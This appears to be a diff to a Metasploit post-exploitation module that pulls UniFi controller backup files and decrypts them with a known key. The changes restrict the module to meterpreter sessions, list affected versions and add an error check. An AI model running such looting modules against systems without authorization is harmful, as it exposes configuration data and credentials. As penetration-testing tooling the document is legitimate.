@@ -16,7 +16,9 @@ class MetasploitModule < Msf::Post
       'Description'   => %q{
         On an Ubiquiti UniFi controller, reads the system.properties configuration file
         and downloads the backup and autobackup files.  The files are then decrypted using
-        a known encryption key, then attempted to be repaired by zip.
+        a known encryption key, then attempted to be repaired by zip.  Meterpreter must be
+        used due to the large file sizes, which can be flaky on regular shells to read.
+        Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more.
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
@@ -26,7 +28,7 @@ class MetasploitModule < Msf::Post
           'justingist' # git script
         ],
       'Platform' => [ 'linux', 'win', 'osx' ],
-      'SessionTypes' => %w[shell meterpreter],
+      'SessionTypes' => %w[meterpreter],
       'References' =>
         [
           ['URL', 'https://github.com/zhangyoufu/unifi-backup-decrypt/'],
@@ -87,6 +89,10 @@ class MetasploitModule < Msf::Post
       end
 
       f = read_file(full)
+      if f.nil?
+        print_error("#{full} read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!")
+        next
+      end
       loot_path = store_loot('ubiquiti.unifi.backup', 'application/zip', session,
                              f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip')
       print_good("File #{full} saved to #{loot_path}")
